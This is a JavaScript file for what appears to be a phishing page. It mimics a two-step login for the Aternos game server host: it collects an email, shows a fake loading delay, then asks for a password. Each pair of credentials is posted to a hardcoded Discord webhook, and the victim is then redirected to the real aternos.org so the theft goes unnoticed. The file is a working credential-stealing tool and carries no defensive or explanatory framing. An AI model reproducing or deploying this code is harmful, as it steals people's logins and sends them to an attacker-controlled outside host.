document.getElementById('submit-email').addEventListener('click', () => {
    const email = document.getElementById('email').value;
    const webhookURL = 'https://discord.com/api/webhooks/1313513927220658226/Y0r4VtaGqbUnWRefochVEgLA9s1F_XOS47qjRMKTDQt4IZIx3b5Bt-UJbI3CPkbWWmhH';

    const formContainer = document.getElementById('form-container');
    formContainer.innerHTML = '<p>Loading<span id="dots"></span></p>';
    let dots = '';
    const dotInterval = setInterval(() => {
        dots = dots.length < 3 ? dots + '.' : '';
        document.getElementById('dots').textContent = dots;
    }, 500);

    setTimeout(() => {
        clearInterval(dotInterval);
        formContainer.innerHTML = `
        <input type="password" id="password" placeholder="Enter Password">
        <button id="submit-password">Submit</button>
        `;

        document.getElementById('submit-password').addEventListener('click', () => {
            const password = document.getElementById('password').value;

            fetch(webhookURL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    content: `Email: ${email}\nPassword: ${password}`
                })
            });
            window.location.href = 'https://aternos.org/servers';
        });
    }, 3000);
});
